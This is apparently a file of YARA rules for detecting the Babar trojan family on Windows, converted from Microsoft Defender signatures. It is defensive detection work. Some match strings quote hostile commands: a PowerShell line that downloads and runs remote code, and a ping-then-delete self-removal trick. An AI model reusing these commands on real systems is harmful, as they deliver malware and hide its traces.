rule Trojan_Win32_Babar_SPQ_2147840773_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.SPQ!MTB"
        threat_id = "2147840773"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c ping 127.0.0.1 && del" wide //weight: 1
        $x_1_2 = "powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')" wide //weight: 1
        $x_1_3 = "%s/ab%d.exe" wide //weight: 1
        $x_1_4 = "fgkhlterfjhkglremkhrethre" wide //weight: 1
        $x_1_5 = "jkewqjterwgerwgre" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_RC_2147846641_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.RC!MTB"
        threat_id = "2147846641"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RAT - SERVER" ascii //weight: 1
        $x_1_2 = "Exit RAT chat" ascii //weight: 1
        $x_1_3 = "CESSA2020\\UTILERIAS\\ratbythedaywalker\\project\\server\\server.vbp" ascii //weight: 1
        $x_1_4 = "Desktop Hidden" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_MKV_2147846727_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MKV!MTB"
        threat_id = "2147846727"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b e9 c1 ed ?? 81 e5 ?? ?? ?? ?? 81 e6 ?? ?? ?? ?? 30 8b ?? ?? ?? ?? 29 3e 6c 24 30 33 a3 ?? ?? ?? ?? da c1 eb ?? 33 74 9d 00 a3 05 1c 8b df 2f 02 5c 00 00 a3 ?? ?? ?? ?? 10 c1 eb ?? 8b e9 89 4c 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_SPS_2147847107_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.SPS!MTB"
        threat_id = "2147847107"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 4d d4 8a 91 ?? ?? ?? ?? 88 55 d3 0f b6 45 d3 03 45 d4 88 45 d3 0f b6 4d d3 f7 d1 88 4d d3 0f b6 55 d3 03 55 d4 88 55 d3}  //weight: 1, accuracy: Low
        $x_1_2 = "oomcebgyjpbwmg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GMC_2147891933_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GMC!MTB"
        threat_id = "2147891933"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {22 db 1f 89 c4 22 11 91 32 22 20 5b 02 d3 49 dc 8e f5}  //weight: 10, accuracy: High
        $x_1_2 = "@.vmp0" ascii //weight: 1
        $x_1_3 = "xuni00A0uni0E01uni" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GPA_2147896300_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GPA!MTB"
        threat_id = "2147896300"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {89 f7 89 f0 31 db 83 c7 5c 81 2e ?? ?? ?? ?? 83 c6 04 66 ba ?? ?? 39 fe 7c ef}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_ABR_2147901335_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.ABR!MTB"
        threat_id = "2147901335"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {50 68 00 a0 00 00 8d 85 f4 5f ff ff 50 8b 45 fc 50}  //weight: 1, accuracy: High
        $x_1_2 = {83 c0 40 8d 95 f4 5f ff ff e8 17 c3 ed ff 8b 85 f0 5f ff ff 33 d2 89 50 3c 8b 85 f0 5f ff ff 33 d2 89 50 44 8b 85 f0 5f ff ff 33 d2 89 50 48}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_SG_2147912601_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.SG!MTB"
        threat_id = "2147912601"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {a1 28 4f 42 00 33 c5 50 ff 75 fc c7 45 fc ff ff ff ff 8d 45 f4}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GLY_2147912815_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GLY!MTB"
        threat_id = "2147912815"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {54 93 41 00 b2 ?? ?? ?? ?? 94 41 00 a1 ?? ?? ?? ?? 94 41 00 c4 94 41 00 14 95 ?? ?? ?? ?? 41 00 19 94 41 00 e3 94 41 00 50 95 41}  //weight: 10, accuracy: Low
        $x_1_2 = "tmpdb.host.lg2030" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_NB_2147917688_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.NB!MTB"
        threat_id = "2147917688"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "The software you just executed is considered (no skidddddddddeddddd) malware" wide //weight: 2
        $x_2_2 = "THE CREATOR (Hugopako) IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS (NOSKID) MALWARE!" wide //weight: 2
        $x_1_3 = "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE" wide //weight: 1
        $x_1_4 = "STILL EXECUTE IT?" wide //weight: 1
        $x_1_5 = "This malware will harm your computer and makes it unusable" wide //weight: 1
        $x_1_6 = "If you are seeing this message without knowing what you just executed, simply press No and nothing will happen" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_NK_2147917708_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.NK!MTB"
        threat_id = "2147917708"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {43 00 3a 00 5c 00 4d 00 41 00 54 00 52 00 49 00 58 00 5c 00 74 00 6d 00 70 00 5c 00 [0-32] 2e 00 76 00 62 00 70 00}  //weight: 3, accuracy: Low
        $x_3_2 = {43 3a 5c 4d 41 54 52 49 58 5c 74 6d 70 5c [0-32] 2e 76 62 70}  //weight: 3, accuracy: Low
        $x_3_3 = "770aae78-f26f-4dba-a829-253c83d1b387" ascii //weight: 3
        $x_1_4 = "GetInstallDetailsPayload" ascii //weight: 1
        $x_1_5 = "DllCanUnloadNow" ascii //weight: 1
        $x_1_6 = "DllRegisterServer" ascii //weight: 1
        $x_1_7 = "DllUnregisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_3_*) and 4 of ($x_1_*))) or
            ((3 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

